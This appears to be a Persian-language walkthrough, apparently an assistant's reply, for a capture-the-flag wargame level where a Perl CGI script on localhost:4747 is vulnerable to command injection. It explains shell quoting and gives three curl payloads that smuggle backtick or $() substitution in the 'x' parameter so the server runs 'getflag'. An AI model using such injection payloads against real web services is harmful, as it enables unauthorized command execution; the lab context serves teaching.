@@ -1,0 +1,47 @@
+و داخل "..." (double quote) نوشتی:
+
+bash
+curl "localhost:4747/level04.pl?x=`getflag`"
+
+داخل double quote، شلِ خودت (level04) اون backtick‌ها رو می‌بینه و فکر می‌کنه: «آها، command substitution! باید اول getflag رو اجرا کنم.»
+
+پس شل اول getflag رو با کاربر level04 اجرا کرد. و getflag وقتی با کاربر خودت اجرا شه، یه پیام می‌ده مثل:
+
+Check flag.Here is your token: ...   یا یه پیام خطا/اجازه
+
+بعد شل خروجیِ اون پیام رو گذاشت وسط URL. اون پیام پر از فاصله و کاراکتر خاصه → URL خراب شد → curl گفت:
+
+Illegal characters found in URL
+
+خلاصه: backtick‌ها سمت تو اجرا شدن، نه سمت سرور. دقیقاً چیزی که نباید بشه.
+
+چرا این مهمه؟ 🎯
+
+چون نشون می‌ده مشکل اصلی کجاست: ما باید backtick‌ها رو دست‌نخورده به سرور برسونیم، تا شلِ سرور (که با flag04 کار می‌کنه) اجراشون کنه — نه شل خودمون.
+
+راه‌حل: backtick‌ها رو از دست شل خودت فرار بده (escape).
+
+
+
+راه ۱ — escape با بک‌اسلش:
+
+bash
+curl "localhost:4747/level04.pl?x=\`getflag\`"
+
+راه ۲ — استفاده از $(...) با escape:
+
+bash
+curl "localhost:4747/level04.pl?x=\$(getflag)"
+
+راه ۳ — تمیزترین، با single quote:
+
+bash
+curl 'localhost:4747/level04.pl?x=`getflag`'
+
+داخل single quote ('...')، شل هیچ کاراکتری رو تفسیر نمی‌کنه، پس backtick‌ها سالم به سرور می‌رسن.
+
+نکته: \ برای escape یعنی «این کاراکتر بعدی رو معنی خاصش رو نادیده بگیر، فقط به‌عنوان متن ببین». (انگلیسی: escape character / فرانسه: caractère d’échappement)
+
+
+
+
